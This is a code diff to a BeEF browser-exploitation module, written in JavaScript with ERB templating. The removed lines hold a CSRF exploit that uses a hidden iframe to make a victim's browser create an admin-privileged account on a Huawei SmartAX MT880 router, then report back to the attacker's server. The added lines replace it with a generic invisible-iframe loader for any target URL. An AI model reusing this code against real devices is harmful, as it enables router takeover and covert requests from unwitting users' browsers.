@@ -14,19 +14,11 @@
 //   limitations under the License.
 //
 beef.execute(function() {
-  var gateway = '<%= @base %>'; 
-  var username = '<%= @username %>';
-  var passwd = '<%= @password %>';
 
-  var huawei_smartax_mt880_iframe = beef.dom.createInvisibleIframe();
-  huawei_smartax_mt880_iframe.setAttribute('src', gateway+"Action?user_id="+username+"&priv=1&pass1="+passwd+"&pass2="+passwd+"&id=70");
+	var target = "<%= @target %>";
+	var iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
+	iframe_<%= @command_id %>.setAttribute('src', target);
 
-  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
-
-  cleanup = function() {
-    document.body.removeChild(huawei_smartax_mt880_iframe);
-  }
-  setTimeout("cleanup()", 15000);
+	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=IFrame created');
 
 });
-
